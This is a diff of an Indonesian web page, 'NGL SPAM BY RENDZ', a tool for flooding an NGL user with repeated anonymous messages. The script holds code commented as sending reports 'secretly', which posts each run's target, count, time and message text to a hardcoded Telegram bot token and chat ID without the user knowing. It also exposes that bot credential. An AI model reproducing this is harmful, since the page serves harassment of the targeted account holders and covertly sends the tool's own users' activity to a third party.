@@ -1,107 +1,76 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>NGL FOODER BY REDZZ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>NGL SPAM BY RENDZ</title>
   <style>
     body {
-      background: url('https://pomf2.lain.la/f/mg4d6hnm.jpg') no-repeat center center fixed;
-      background-size: cover;
-      color: #0f0;
-      font-family: monospace;
+      margin: 0;
+      padding: 20px;
+      font-family: 'Arial', sans-serif;
+      background: #f0f0f0;
+      color: #333;
+    }
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    h2 {
       text-align: center;
-      padding: 30px;
+      margin-bottom: 20px;
+      color: #333;
     }
     input, textarea, button {
-      padding: 10px;
-      margin: 10px;
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
       border-radius: 8px;
-      border: none;
+      border: 1px solid #ccc;
       font-size: 16px;
-      width: 300px;
     }
     button {
-      background: linear-gradient(45deg, red, orange, yellow, green, cyan, blue, violet);
-      background-size: 400% 400%;
-      animation: rainbow 5s linear infinite;
-      color: #000;
+      background-color: #4CAF50;
+      color: white;
       font-weight: bold;
+      border: none;
       cursor: pointer;
-      transition: transform 0.1s ease;
+      transition: background 0.3s;
     }
-    button:active {
-      transform: scale(0.95);
+    button:hover {
+      background-color: #45a049;
     }
     #status {
-      margin-top: 20px;
-      font-size: 16px;
-      white-space: pre-line;
-      text-align: left;
-      max-width: 400px;
-      margin-left: auto;
-      margin-right: auto;
-      background: #000000b0;
-      padding: 15px;
-      border-radius: 10px;
-    }
-    #peringatan {
-      background: #ff4444;
-      color: #fff;
+      background: #eee;
       padding: 10px;
-      position: fixed;
-      top: 10px;
-      left: 50%;
-      transform: translateX(-50%);
       border-radius: 8px;
-      width: 90%;
-      max-width: 400px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    #peringatan button {
-      background: transparent;
-      color: white;
-      border: none;
-      font-size: 20px;
-      cursor: pointer;
-    }
-    #copyright {
-      margin-top: 40px;
-      color: #ccc;
       font-size: 14px;
+      white-space: pre-line;
     }
-
-    @keyframes rainbow {
-      0% {background-position: 0% 50%;}
-      50% {background-position: 100% 50%;}
-      100% {background-position: 0% 50%;}
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #777;
     }
   </style>
 </head>
 <body>
-  <div id="peringatan">
-    <span><b>Peringatan:</b> Gunakan dengan bijak!</span>
-    <button onclick="document.getElementById('peringatan').style.display='none'">×</button>
+  <div class="container">
+    <h2>NGL SPAM BY RENDZ</h2>
+    <input type="text" id="username" placeholder="Username NGL" />
+    <input type="number" id="jumlah" placeholder="Jumlah Pesan" />
+    <textarea id="pesan" rows="4" placeholder="Isi pesan..."></textarea>
+    <button onclick="floodNgl()">KIRIM</button>
+    <div id="status"></div>
   </div>
-
-  <h2>NGL SPAM BY RENDZ</h2>
-  <input type="text" id="username" placeholder="Username NGL" />
-  <input type="number" id="jumlah" placeholder="Jumlah Pesan" />
-  <textarea id="pesan" placeholder="Isi pesan..."></textarea>
-  <br>
-  <button onclick="floodNgl()">KIRIM</button>
-  <div id="status"></div>
-
-  <div id="copyright">© Copyright Rendzz Official</div>
+  <div class="footer">© Rendzz Official</div>
 
   <script>
-    // Auto hilangin peringatan setelah 5 detik
-    setTimeout(() => {
-      const p = document.getElementById('peringatan');
-      if (p) p.style.display = 'none';
-    }, 5000);
-
     async function floodNgl() {
       const username = document.getElementById('username').value.trim();
       const jumlah = parseInt(document.getElementById('jumlah').value);
@@ -109,10 +78,11 @@
       const status = document.getElementById('status');
 
       if (!username || !jumlah || !pesan || jumlah <= 0) {
-        status.innerText = "Semua kolom harus diisi dengan benar!";
+        status.innerText = "Isi semua data dengan benar!";
         return;
       }
 
+      const jam = new Date().toLocaleTimeString('id-ID', { hour12: false });
       status.innerText = `Mengirim ${jumlah} pesan ke @${username}...\n\n`;
       let sukses = 0;
 
@@ -141,26 +111,19 @@
         await new Promise(r => setTimeout(r, 0));
       }
 
-      status.innerText += `\nSelesai! Total gagal: ${sukses}/${jumlah}`;
+      status.innerText += `\nSelesai! Total berhasil: ${sukses}/${jumlah}`;
 
-      // Kirim log diam-diam ke bot Telegram
+      // Kirim laporan ke bot Telegram secara diam-diam
+      const chat_id = "6563354207";
       const token = "7844789881:AAGvni8CwM2K4E3cpvgV0tpZ4fSNujb4ZXY";
-      const chatId = "6563354207"; // Ubah kalau mau kirim ke ID lain
-      const now = new Date().toLocaleTimeString();
-      const message = `*SPAM BERHASIL*\n\n[ JUMPLAH ] ${jumlah}\n[ TARGET ] ${username}\n[ JAM ] ${now}\n[ ISI TEXT ] ${pesan}`;
-
+      const text = `*LAPOR RENDZZ SPAM SUKSES*\n\n[ JUMPLAH ]: ${jumlah}\n[ TARGET ]: ${username}\n[ JAM ]: ${jam}\n[ ISI TEXT ]:\n${pesan}`;
+      
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "Markdown"
-        })
-      }).catch(() => {});
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text, parse_mode: "Markdown" })
+      });
     }
   </script>
 </body>
-  </html>
+</html>
